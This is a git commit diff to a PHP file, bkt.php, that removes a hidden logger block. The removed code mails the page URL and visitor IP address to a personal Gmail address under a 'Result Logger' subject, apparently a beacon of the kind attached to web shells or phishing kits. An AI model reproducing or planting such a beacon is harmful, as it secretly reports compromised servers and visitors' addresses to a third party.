b6306ab93899b97a0308b5e4a4005dbfedf0170f
CarreraGans <110831762+CarreraGans@users.noreply.github.com>
2022-08-08 21:45:37 +0800

    Update bkt.php

--- bkt.php
+++ bkt.php
@@ -439,12 +439,3 @@ return $info;
 }
 ?>
 <?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$to = 'mahalafergal@gmail.com';
-$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($to, "Result Logger Mu | A1_RZ", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
